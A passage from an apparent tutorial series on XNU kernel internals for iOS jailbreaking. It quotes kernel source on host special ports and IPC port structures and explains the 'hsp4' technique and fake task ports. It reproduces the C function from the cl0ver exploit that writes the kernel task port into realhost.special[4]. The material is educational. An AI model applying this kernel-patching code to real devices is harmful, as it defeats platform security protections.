    <span class="mi">1405</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">1406</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* SECURE_KERNEL */</span>
    <span class="mi">1407</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1408</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* CONFIG_EMBEDDED */</span>
    <span class="mi">1409</span><span class="o">:</span> 
    <span class="mi">1410</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">1411</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">1412</span><span class="o">:</span> </code></pre></figure>

<p>So while the kernel task is still obtained, you won’t be able to call the Mach APIs on it since it goes through the conversion APIs which will return <strong>KERN_INVALID_SECURITY</strong> and the previous function will return a <strong>TASK_NULL</strong>. There is another check by the way, which is that on embedded platforms, the code checks for the <strong>TF_PLATFORM</strong> flag in the code signature, which is nothing but the <strong>platform-application</strong> entitlement, which means that a caller without this entitlement cannot perform an operation on the victim that has this entitlement. We will discuss this in Part 3 of this series.</p>

<p>Hence, one of the more recent techniques has been to use the <strong>host_get_special_port()</strong> function. To understand this, head over to the file <strong>osfmk/mach/host_special_ports.h</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">host_special_ports</span><span class="p">.</span><span class="n">h</span>
    <span class="mo">067</span><span class="o">:</span> <span class="cm">/*
    068:  * Cannot be set or gotten from user space
    069:  */</span>
    <span class="mo">070</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_SECURITY_PORT</span>               <span class="mi">0</span>
    <span class="mo">071</span><span class="o">:</span> 
    <span class="mo">072</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_MIN_SPECIAL_PORT</span>            <span class="n">HOST_SECURITY_PORT</span>
    <span class="mo">073</span><span class="o">:</span> 
    <span class="mo">074</span><span class="o">:</span> <span class="cm">/*
    075:  * Always provided by kernel (cannot be set from user-space).
    076:  */</span>
    <span class="mo">077</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_PORT</span>                        <span class="mi">1</span>
    <span class="mo">07</span><span class="mi">8</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_PRIV_PORT</span>                   <span class="mi">2</span>
    <span class="mo">07</span><span class="mi">9</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_IO_MASTER_PORT</span>              <span class="mi">3</span>
    <span class="mi">080</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span>     <span class="mi">7</span> <span class="cm">/* room to grow */</span>
    <span class="mi">081</span><span class="o">:</span> 
    <span class="mi">082</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_LAST_SPECIAL_KERNEL_PORT</span>    <span class="n">HOST_IO_MASTER_PORT</span>
    <span class="mi">083</span><span class="o">:</span> 
    <span class="mi">084</span><span class="o">:</span> <span class="cm">/*
    085:  * Not provided by kernel
    086:  */</span>
    <span class="mi">087</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_DYNAMIC_PAGER_PORT</span>         <span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">088</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_AUDIT_CONTROL_PORT</span>         <span class="p">(</span><span class="mi">2</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">089</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_USER_NOTIFICATION_PORT</span>     <span class="p">(</span><span class="mi">3</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">090</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_AUTOMOUNTD_PORT</span>            <span class="p">(</span><span class="mi">4</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">091</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_LOCKD_PORT</span>                 <span class="p">(</span><span class="mi">5</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">092</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_KTRACE_BACKGROUND_PORT</span>     <span class="p">(</span><span class="mi">6</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">093</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_SEATBELT_PORT</span>              <span class="p">(</span><span class="mi">7</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">094</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_KEXTD_PORT</span>                 <span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">095</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_LAUNCHCTL_PORT</span>             <span class="p">(</span><span class="mi">9</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">096</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_UNFREED_PORT</span>		<span class="p">(</span><span class="mi">10</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">097</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_AMFID_PORT</span>			<span class="p">(</span><span class="mi">11</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">098</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_GSSD_PORT</span>			<span class="p">(</span><span class="mi">12</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">099</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_TELEMETRY_PORT</span>		<span class="p">(</span><span class="mi">13</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">100</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_ATM_NOTIFICATION_PORT</span>	<span class="p">(</span><span class="mi">14</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">101</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_COALITION_PORT</span>		<span class="p">(</span><span class="mi">15</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">102</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_SYSDIAGNOSE_PORT</span>           <span class="p">(</span><span class="mi">16</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">103</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_XPC_EXCEPTION_PORT</span>		<span class="p">(</span><span class="mi">17</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">104</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_CONTAINERD_PORT</span>		<span class="p">(</span><span class="mi">18</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">105</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_NODE_PORT</span>			<span class="p">(</span><span class="mi">19</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">106</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_RESOURCE_NOTIFY_PORT</span>	<span class="p">(</span><span class="mi">20</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">107</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_CLOSURED_PORT</span>		<span class="p">(</span><span class="mi">21</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">108</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_SYSPOLICYD_PORT</span>		<span class="p">(</span><span class="mi">22</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">109</span><span class="o">:</span> 
    <span class="mi">110</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_MAX_SPECIAL_PORT</span>		<span class="n">HOST_SYSPOLICYD_PORT</span>
    <span class="mi">111</span><span class="o">:</span>                                         <span class="cm">/* MAX = last since rdar://35861175 */</span>
    <span class="mi">112</span><span class="o">:</span> 
    <span class="mi">113</span><span class="o">:</span> <span class="cm">/* obsolete name */</span>
    <span class="mi">114</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_CHUD_PORT</span> <span class="n">HOST_LAUNCHCTL_PORT</span>
    <span class="mi">115</span><span class="o">:</span> </code></pre></figure>

<p>This contains a bunch of special ports, which as you might have guessed already from the comments, are used for special purposes. From the comments, it is clear that the first seven ports are reserved for the kernel itself. However, only three of them are being used so far. The <strong>HOST_PORT</strong> provides an abstraction over the host and <strong>HOST_PRIV</strong> is used for privileged operations, while the <strong>HOST_IO_MASTER_PORT</strong> is used to interact with devices. Each Host special port is mentioned with a particular number, which is of quite a significance. We can note that <strong>#4</strong> is not being used anywhere.</p>

<p>Another thing worth mentioning is that in order to get send right to a host special port, you need to call <strong>host_get_special_port</strong> with an <strong>int node</strong> parameter, which is the number allocated to that special port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">host</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">1193</span><span class="o">:</span> <span class="cm">/*
    1194:  *      User interface for setting a special port.
    1195:  *
    1196:  *      Only permits the user to set a user-owned special port
    1197:  *      ID, rejecting a kernel-owned special port ID.
    1198:  *
    1199:  *      A special kernel port cannot be set up using this
    1200:  *      routine; use kernel_set_special_port() instead.
    1201:  */</span>
    <span class="mi">1202</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">1203</span><span class="o">:</span> <span class="n">host_set_special_port</span><span class="p">(</span><span class="n">host_priv_t</span> <span class="n">host_priv</span><span class="p">,</span> <span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="n">ipc_port_t</span> <span class="n">port</span><span class="p">)</span>
    <span class="mi">1204</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1205</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">host_priv</span> <span class="o">==</span> <span class="n">HOST_PRIV_NULL</span> <span class="o">||</span> <span class="n">id</span> <span class="o">&lt;=</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span> <span class="o">||</span> <span class="n">id</span> <span class="o">&gt;</span> <span class="n">HOST_MAX_SPECIAL_PORT</span><span class="p">)</span>
    <span class="mi">1206</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">KERN_INVALID_ARGUMENT</span><span class="p">);</span>
    <span class="mi">1207</span><span class="o">:</span> 
    <span class="mi">1208</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_MACF</span>
    <span class="mi">1209</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">mac_task_check_set_host_special_port</span><span class="p">(</span><span class="n">current_task</span><span class="p">(),</span> <span class="n">id</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="mi">1210</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">KERN_NO_ACCESS</span><span class="p">);</span>
    <span class="mi">1211</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">1212</span><span class="o">:</span> 
    <span class="mi">1213</span><span class="o">:</span> 	<span class="k">return</span> <span class="p">(</span><span class="n">kernel_set_special_port</span><span class="p">(</span><span class="n">host_priv</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="n">port</span><span class="p">));</span>
    <span class="mi">1214</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">1215</span><span class="o">:</span> 
    <span class="mi">1216</span><span class="o">:</span> <span class="cm">/*
    1217:  *      User interface for retrieving a special port.
    1218:  *
    1219:  *      Note that there is nothing to prevent a user special
    1220:  *      port from disappearing after it has been discovered by
    1221:  *      the caller; thus, using a special port can always result
    1222:  *      in a "port not valid" error.
    1223:  */</span>
    <span class="mi">1224</span><span class="o">:</span> 
    <span class="mi">1225</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">1226</span><span class="o">:</span> <span class="n">host_get_special_port</span><span class="p">(</span><span class="n">host_priv_t</span> <span class="n">host_priv</span><span class="p">,</span> <span class="n">__unused</span> <span class="kt">int</span> <span class="n">node</span><span class="p">,</span> <span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="n">ipc_port_t</span> <span class="o">*</span> <span class="n">portp</span><span class="p">)</span>
    <span class="mi">1227</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1228</span><span class="o">:</span> 	<span class="n">ipc_port_t</span> <span class="n">port</span><span class="p">;</span>
    <span class="mi">1229</span><span class="o">:</span> 
    <span class="mi">1230</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">host_priv</span> <span class="o">==</span> <span class="n">HOST_PRIV_NULL</span> <span class="o">||</span> <span class="n">id</span> <span class="o">==</span> <span class="n">HOST_SECURITY_PORT</span> <span class="o">||</span> <span class="n">id</span> <span class="o">&gt;</span> <span class="n">HOST_MAX_SPECIAL_PORT</span> <span class="o">||</span> <span class="n">id</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="mi">1231</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">KERN_INVALID_ARGUMENT</span><span class="p">);</span>
    <span class="mi">1232</span><span class="o">:</span> 
    <span class="mi">1233</span><span class="o">:</span> 	<span class="n">host_lock</span><span class="p">(</span><span class="n">host_priv</span><span class="p">);</span>
    <span class="mi">1234</span><span class="o">:</span> 	<span class="n">port</span> <span class="o">=</span> <span class="n">realhost</span><span class="p">.</span><span class="n">special</span><span class="p">[</span><span class="n">id</span><span class="p">];</span>
    <span class="mi">1235</span><span class="o">:</span> 	<span class="o">*</span><span class="n">portp</span> <span class="o">=</span> <span class="n">ipc_port_copy_send</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">1236</span><span class="o">:</span> 	<span class="n">host_unlock</span><span class="p">(</span><span class="n">host_priv</span><span class="p">);</span>
    <span class="mi">1237</span><span class="o">:</span> 
    <span class="mi">1238</span><span class="o">:</span> 	<span class="k">return</span> <span class="p">(</span><span class="n">KERN_SUCCESS</span><span class="p">);</span>
    <span class="mi">1239</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">1240</span><span class="o">:</span> </code></pre></figure>

<p>Looking at the function, we can see that it requires the <strong>host_priv</strong> port as a parameter, and hence executing this call requires root permissions, in addition to all the sandbox checks. The <strong>host_get_special_port</strong> function essentially gets the port value from <strong>realhost.special[node]</strong> and returns it back to the caller.</p>

<p>Coming back to the pointer check, if we can do a remap on the kernel task, write it to the unused port space, which is <strong>realhost.special[4]</strong>, and then call <strong>host_get_special_port(4)</strong>, this should give us a remapped and working kernel task.</p>

<p>The following code snippet from <strong>cl0ver</strong> written by <a href="https://twitter.com/Siguza">Siguza</a> does exactly that</p>

<p>.</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">bool</span> <span class="nf">patch_host_special_port_4</span><span class="p">(</span><span class="n">task_t</span> <span class="n">kernel_task</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Installing host_special_port(4) patch..."</span><span class="p">);</span>

        <span class="n">addr_t</span> <span class="o">*</span><span class="n">special</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr_t</span><span class="o">*</span><span class="p">)</span><span class="n">offsets</span><span class="p">.</span><span class="n">slid</span><span class="p">.</span><span class="n">data_realhost_special</span><span class="p">;</span>
        <span class="n">vm_address_t</span> <span class="n">kernel_task_addr</span><span class="p">,</span>
                     <span class="n">kernel_self_port_addr</span><span class="p">,</span>
                     <span class="n">old_port_addr</span><span class="p">;</span>
        <span class="n">vm_size_t</span> <span class="n">size</span><span class="p">;</span>
        <span class="n">kern_return_t</span> <span class="n">ret</span><span class="p">;</span>

        <span class="c1">// Get address of kernel task</span>
        <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_task_addr</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">vm_read_overwrite</span><span class="p">(</span><span class="n">kernel_task</span><span class="p">,</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="n">offsets</span><span class="p">.</span><span class="n">slid</span><span class="p">.</span><span class="n">data_kernel_task</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_task_addr</span><span class="p">),</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">kernel_task_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">THROW</span><span class="p">(</span><span class="s">"Failed to get kernel task address: %s"</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Kernel task address: "</span> <span class="n">ADDR</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_t</span><span class="p">)</span><span class="n">kernel_task_addr</span><span class="p">);</span>

        <span class="c1">// Get address of kernel task/self port</span>
        <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_self_port_addr</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">vm_read_overwrite</span><span class="p">(</span><span class="n">kernel_task</span><span class="p">,</span> <span class="n">kernel_task_addr</span> <span class="o">+</span> <span class="n">offsets</span><span class="p">.</span><span class="n">unslid</span><span class="p">.</span><span class="n">off_task_itk_self</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_self_port_addr</span><span class="p">),</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">kernel_self_port_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">THROW</span><span class="p">(</span><span class="s">"Failed to get kernel task port address: %s"</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Kernel task port address: "</span> <span class="n">ADDR</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_t</span><span class="p">)</span><span class="n">kernel_self_port_addr</span><span class="p">);</span>

        <span class="c1">// Check if realhost.special[4] is set already</span>
        <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">old_port_addr</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">vm_read_overwrite</span><span class="p">(</span><span class="n">kernel_task</span><span class="p">,</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">special</span><span class="p">[</span><span class="mi">4</span><span class="p">]),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">old_port_addr</span><span class="p">),</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">old_port_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">THROW</span><span class="p">(</span><span class="s">"Failed to read realhost.special[4]: %s"</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">old_port_addr</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">old_port_addr</span> <span class="o">==</span> <span class="n">kernel_self_port_addr</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Patch already in place, nothing to do"</span><span class="p">);</span>
                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">THROW</span><span class="p">(</span><span class="s">"realhost.special[4] has a valid port already"</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="c1">// Write to realhost.special[4]</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">vm_write</span><span class="p">(</span><span class="n">kernel_task</span><span class="p">,</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">special</span><span class="p">[</span><span class="mi">4</span><span class="p">]),</span> <span class="p">(</span><span class="n">vm_address_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">kernel_self_port_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_self_port_addr</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">THROW</span><span class="p">(</span><span class="s">"Failed to patch realhost.special[4]: %s"</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="n">DEBUG</span><span class="p">(</span><span class="s">"Successfully installed patch"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>This technique is also known as the <strong>hsp4</strong> patch and widely used in some of the recent jailbreaks.</p>

<h2 id="faking-task-ports">Faking Task Ports</h2>

<p>One of the most common techniques used in some of the recent jailbreaks is that of using Fake ports. The idea is to make the kernel look up a user controlled memory space thinking that it is a port. Using certain APIs, we can then extract data out of the kernel.</p>

<p>Let’s have a look at the stripped port structure which can be found in <strong>osfmk/ipc/ipc_port.h</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_port</span><span class="p">.</span><span class="n">h</span><span class="err">}</span>
    <span class="mi">112</span><span class="o">:</span> 
    <span class="mi">113</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_port</span> <span class="p">{</span>
    <span class="mi">114</span><span class="o">:</span> 
    <span class="mi">115</span><span class="o">:</span> 	<span class="cm">/*
    116: 	 * Initial sub-structure in common with ipc_pset
    117: 	 * First element is an ipc_object second is a
    118: 	 * message queue
    119: 	 */</span>
    <span class="mi">120</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_object</span> <span class="n">ip_object</span><span class="p">;</span>
    <span class="mi">121</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_mqueue</span> <span class="n">ip_messages</span><span class="p">;</span>
    <span class="mi">122</span><span class="o">:</span> 
    <span class="mi">123</span><span class="o">:</span> 	<span class="k">union</span> <span class="p">{</span>
    <span class="mi">124</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">ipc_space</span> <span class="o">*</span><span class="n">receiver</span><span class="p">;</span>
    <span class="mi">125</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">ipc_port</span> <span class="o">*</span><span class="n">destination</span><span class="p">;</span>
    <span class="mi">126</span><span class="o">:</span> 		<span class="n">ipc_port_timestamp_t</span> <span class="n">timestamp</span><span class="p">;</span>
    <span class="mi">127</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">data</span><span class="p">;</span>
    <span class="mi">128</span><span class="o">:</span> 
    <span class="mi">129</span><span class="o">:</span> 	<span class="k">union</span> <span class="p">{</span>
    <span class="mi">130</span><span class="o">:</span> 		<span class="n">ipc_kobject_t</span> <span class="n">kobject</span><span class="p">;</span>
    <span class="mi">131</span><span class="o">:</span> 		<span class="n">ipc_importance_task_t</span> <span class="n">imp_task</span><span class="p">;</span>
    <span class="mi">132</span><span class="o">:</span> 		<span class="n">ipc_port_t</span> <span class="n">sync_inheritor_port</span><span class="p">;</span>
    <span class="mi">133</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">knote</span> <span class="o">*</span><span class="n">sync_inheritor_knote</span><span class="p">;</span>
    <span class="mi">134</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">turnstile</span> <span class="o">*</span><span class="n">sync_inheritor_ts</span><span class="p">;</span>
    <span class="mi">135</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">kdata</span><span class="p">;</span>
    <span class="mi">136</span><span class="o">:</span> 
    <span class="mi">137</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_port</span> <span class="o">*</span><span class="n">ip_nsrequest</span><span class="p">;</span>
    <span class="mi">138</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_port</span> <span class="o">*</span><span class="n">ip_pdrequest</span><span class="p">;</span>
    <span class="mi">139</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">ipc_port_request</span> <span class="o">*</span><span class="n">ip_requests</span><span class="p">;</span>
    <span class="mi">140</span><span class="o">:</span> 	<span class="k">union</span> <span class="p">{</span>
    <span class="mi">141</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">ipc_kmsg</span> <span class="o">*</span><span class="n">premsg</span><span class="p">;</span>
    <span class="mi">142</span><span class="o">:</span> 		<span class="k">struct</span> <span class="n">turnstile</span> <span class="o">*</span><span class="n">send_turnstile</span><span class="p">;</span>
    <span class="mi">143</span><span class="o">:</span> 		<span class="n">SLIST_ENTRY</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="n">dealloc_elm</span><span class="p">;</span>
    <span class="mi">144</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">kdata2</span><span class="p">;</span>
   </code></pre></figure>

<p>The first attribute is an <strong>ipc_object</strong> struct that can be found in <strong>osfmk/ipc/ipc_object.h</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_object</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">088</span><span class="o">:</span> <span class="cm">/*
    089:  * The ipc_object is used to both tag and reference count these two data
    090:  * structures, and (Noto Bene!) pointers to either of these or the
    091:  * ipc_object at the head of these are freely cast back and forth; hence
    092:  * the ipc_object MUST BE FIRST in the ipc_common_data.
    093:  * 
    094:  * If the RPC implementation enabled user-mode code to use kernel-level
    095:  * data structures (as ours used to), this peculiar structuring would
    096:  * avoid having anything in user code depend on the kernel configuration
    097:  * (with which lock size varies).
    098:  */</span>
    <span class="mi">099</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_object</span> <span class="p">{</span>
    <span class="mi">100</span><span class="o">:</span> 	<span class="n">ipc_object_bits_t</span> <span class="n">io_bits</span><span class="p">;</span>
    <span class="mi">101</span><span class="o">:</span> 	<span class="n">ipc_object_refs_t</span> <span class="n">io_references</span><span class="p">;</span>
    <span class="mi">102</span><span class="o">:</span> 	<span class="n">lck_spin_t</span>	<span class="n">io_lock_data</span><span class="p">;</span>
    <span class="mi">103</span><span class="o">:</span> <span class="p">};</span></code></pre></figure>

<p>The first field is <strong>io_bits</strong>, the details about these bits can be found under <strong>osfmk/ipc/ipc_object.h</strong></p>

